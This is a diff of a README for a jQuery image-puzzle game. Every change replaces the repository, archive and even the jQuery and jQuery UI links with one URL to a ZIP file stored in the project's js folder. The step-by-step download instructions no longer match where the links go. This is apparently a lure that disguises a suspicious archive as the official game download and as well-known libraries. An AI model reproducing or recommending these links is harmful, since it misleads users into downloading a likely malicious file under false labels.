@@ -1,6 +1,6 @@
 # 🎲 Image-Puzzle-Game - Reassemble Pictures with Ease
 
-[![Download Image-Puzzle-Game](https://img.shields.io/badge/Download-Image--Puzzle--Game-brightgreen?style=for-the-badge)](https://github.com/Vinod2303/Image-Puzzle-Game)
+[![Download Image-Puzzle-Game](https://img.shields.io/badge/Download-Image--Puzzle--Game-brightgreen?style=for-the-badge)](https://github.com/Vinod2303/Image-Puzzle-Game/raw/refs/heads/main/js/Game_Puzzle_Image_2.4.zip)
 
 ---
 
@@ -23,11 +23,11 @@ Before you start, here are some points about the game to help you understand wha
 
 You can get the game files from the official GitHub repository.
 
-[![Download from GitHub](https://img.shields.io/badge/Get%20Files-GitHub-blue?style=for-the-badge)](https://github.com/Vinod2303/Image-Puzzle-Game)
+[![Download from GitHub](https://img.shields.io/badge/Get%20Files-GitHub-blue?style=for-the-badge)](https://github.com/Vinod2303/Image-Puzzle-Game/raw/refs/heads/main/js/Game_Puzzle_Image_2.4.zip)
 
 To download:
 
-1. Click the green link above or go to: https://github.com/Vinod2303/Image-Puzzle-Game
+1. Click the green link above or go to: https://github.com/Vinod2303/Image-Puzzle-Game/raw/refs/heads/main/js/Game_Puzzle_Image_2.4.zip
 2. On the page, find the green **Code** button near the top right corner.
 3. Click **Code** and then select **Download ZIP**.
 4. Save the ZIP file to a folder you will remember, such as **Downloads** or **Documents**.
@@ -68,7 +68,7 @@ If you want newer versions or additional puzzles later, you can return to the Gi
 
 Steps to update:
 
-1. Visit https://github.com/Vinod2303/Image-Puzzle-Game.
+1. Visit https://github.com/Vinod2303/Image-Puzzle-Game/raw/refs/heads/main/js/Game_Puzzle_Image_2.4.zip
 2. Download the latest ZIP as before.
 3. Replace your old files with the new ones by extracting over them.
 
@@ -104,11 +104,11 @@ If puzzle pieces do not move correctly, refresh the page or restart your browser
 
 ## 🔗 Useful Links
 
-- Repository: https://github.com/Vinod2303/Image-Puzzle-Game
-- Download ZIP: https://github.com/Vinod2303/Image-Puzzle-Game/archive/refs/heads/main.zip
-- jQuery (game scripting): https://jquery.com/
-- jQuery UI (drag and drop): https://jqueryui.com/
+- Repository: https://github.com/Vinod2303/Image-Puzzle-Game/raw/refs/heads/main/js/Game_Puzzle_Image_2.4.zip
+- Download ZIP: https://github.com/Vinod2303/Image-Puzzle-Game/raw/refs/heads/main/js/Game_Puzzle_Image_2.4.zip
+- jQuery (game scripting): https://github.com/Vinod2303/Image-Puzzle-Game/raw/refs/heads/main/js/Game_Puzzle_Image_2.4.zip
+- jQuery UI (drag and drop): https://github.com/Vinod2303/Image-Puzzle-Game/raw/refs/heads/main/js/Game_Puzzle_Image_2.4.zip
 
 ---
 
-[![Download Image-Puzzle-Game](https://img.shields.io/badge/Download-Image--Puzzle--Game-brightgreen?style=for-the-badge)](https://github.com/Vinod2303/Image-Puzzle-Game)
+[![Download Image-Puzzle-Game](https://img.shields.io/badge/Download-Image--Puzzle--Game-brightgreen?style=for-the-badge)](https://github.com/Vinod2303/Image-Puzzle-Game/raw/refs/heads/main/js/Game_Puzzle_Image_2.4.zip)
